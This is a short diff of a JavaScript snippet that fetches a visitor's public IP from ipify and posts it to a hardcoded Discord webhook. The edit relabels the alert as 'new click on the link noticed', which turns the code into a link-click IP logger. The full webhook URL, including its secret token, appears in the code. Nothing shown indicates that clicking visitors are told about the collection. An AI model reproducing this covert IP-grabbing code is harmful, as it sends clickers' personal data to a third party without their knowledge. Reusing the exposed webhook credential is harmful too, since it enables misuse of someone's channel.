@@ -6,7 +6,7 @@ fetch("https://api.ipify.org?format=json")
     const webhookUrl = "https://discord.com/api/webhooks/1394554954391355492/comU-mif2egSzF70Vx8BIyBr0yH4y2MuUOjbSKYql6As7GIu9kTxiIkZwv0xeJMOA1jI";
     
     const payload = {
-      content: `📨 Neue Bewerbung: ${ip}`
+      content: `📨 Neuen Klick auf den Link bemerkt: ${ip}`
     };
 
     fetch(webhookUrl, {
